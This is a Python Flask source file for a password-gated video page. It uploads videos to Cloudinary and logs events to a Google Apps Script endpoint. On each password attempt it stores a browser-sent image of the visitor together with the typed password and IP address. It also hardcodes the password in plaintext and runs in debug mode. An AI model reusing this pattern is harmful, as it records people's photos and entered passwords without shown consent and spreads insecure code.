from flask import Flask, render_template, request, jsonify
from datetime import datetime
import cloudinary
import cloudinary.uploader
from dotenv import load_dotenv
from werkzeug.utils import secure_filename
import os, json, requests, pytz

app = Flask(__name__)

# Load environment variables
load_dotenv()

CLOUDINARY_CLOUD_NAME = os.getenv("CLOUDINARY_CLOUD_NAME")
CLOUDINARY_API_KEY = os.getenv("CLOUDINARY_API_KEY")
CLOUDINARY_API_SECRET = os.getenv("CLOUDINARY_API_SECRET")
GOOGLE_SCRIPT_URL = os.getenv("GOOGLE_SCRIPT_URL")

cloudinary.config(
    cloud_name=CLOUDINARY_CLOUD_NAME,
    api_key=CLOUDINARY_API_KEY,
    api_secret=CLOUDINARY_API_SECRET
)

VIDEO_STORE_FILE = "last_video.json"

# ==============================
# Helpers
# ==============================
def save_last_video(video_url):
    try:
        with open(VIDEO_STORE_FILE, "w") as f:
            json.dump({"video_url": video_url}, f)
    except Exception as e:
        print("⚠️ Failed to save last video:", e)


def get_last_video():
    try:
        response = requests.get(GOOGLE_SCRIPT_URL, timeout=10)
        data = response.json()
        video_url = data.get("video_url")
        if video_url:
            save_last_video(video_url)
            return video_url
    except Exception as e:
        print("⚠️ Could not fetch latest video:", e)
    if os.path.exists(VIDEO_STORE_FILE):
        try:
            with open(VIDEO_STORE_FILE, "r") as f:
                data = json.load(f)
                return data.get("video_url")
        except:
            pass
    return None

# ==============================
# Capture image from browser
# ==============================
@app.route("/capture_attempt", methods=["POST"])
def capture_attempt():
    try:
        password = request.form.get("password", "")
        if "image" not in request.files:
            return jsonify({"status": "error", "error": "No image uploaded"})
        image = request.files["image"]

        filename = secure_filename(image.filename)

        # Upload to Cloudinary
        upload_result = cloudinary.uploader.upload(
            image,
            folder="password_attempts",
            public_id=f"attempt_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        )
        image_url = upload_result.get("secure_url")

        # Log attempt to Google Sheet
        ip_address = request.headers.get("X-Forwarded-For", request.remote_addr)
        india_time = datetime.now(pytz.timezone("Asia/Kolkata")).strftime("%Y-%m-%d %H:%M:%S")
        payload = {
            "timestamp": india_time,
            "event": "password_attempt",
            "password_entered": password,
            "ip_address": ip_address,
            "result": "success" if password=="23E51A05C1" else "failed",
            "image_url": image_url
        }
        if GOOGLE_SCRIPT_URL:
            try:
                requests.post(GOOGLE_SCRIPT_URL, json=payload, timeout=10)
            except:
                pass

        return jsonify({"status":"ok", "image_url": image_url})
    except Exception as e:
        print("Capture Error:", e)
        return jsonify({"status":"error", "error": str(e)})

# ==============================
# Routes
# ==============================
@app.route("/")
def index():
    video_url = get_last_video()
    try:
        ip_address = request.headers.get("X-Forwarded-For", request.remote_addr)
        india_time = datetime.now(pytz.timezone("Asia/Kolkata")).strftime("%Y-%m-%d %H:%M:%S")
        payload = {
            "timestamp": india_time,
            "event": "page_visit",
            "ip_address": ip_address,
            "password_attempt": "",
            "result": "visited"
        }
        if GOOGLE_SCRIPT_URL:
            requests.post(GOOGLE_SCRIPT_URL, json=payload, timeout=10)
    except:
        pass
    return render_template("index.html", datetime=datetime, video_url=video_url)

@app.route("/log_action", methods=["POST"])
def log_action():
    try:
        data = request.get_json(force=True)
        password_attempt = data.get("password", "")
        event = data.get("action", "password_attempt" if password_attempt else "unknown")
        result = "success" if password_attempt == "23E51A05C1" else "failed" if password_attempt else "clicked"
        ip_address = request.headers.get("X-Forwarded-For", request.remote_addr)
        india_time = datetime.now(pytz.timezone("Asia/Kolkata")).strftime("%Y-%m-%d %H:%M:%S")
        payload = {
            "timestamp": india_time,
            "event": event,
            "ip_address": ip_address,
            "password_attempt": password_attempt,
            "result": result
        }
        if GOOGLE_SCRIPT_URL:
            try:
                requests.post(GOOGLE_SCRIPT_URL, json=payload, timeout=10)
            except:
                pass
        return jsonify({"status": "ok", "result": result})
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)})

@app.route("/upload_story", methods=["POST"])
def upload_story():
    try:
        if "video" not in request.files:
            return jsonify({"status": "error", "error": "No video part"})
        video = request.files["video"]
        if video.filename == "":
            return jsonify({"status": "error", "error": "No selected file"})
        filename = secure_filename(video.filename)
        upload_result = cloudinary.uploader.upload(
            video,
            resource_type="video",
            folder="stories"
        )
        video_url = upload_result.get("secure_url")
        save_last_video(video_url)
        return jsonify({"status": "ok", "video_url": video_url})
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)})

if __name__ == "__main__":
    app.run(debug=True)
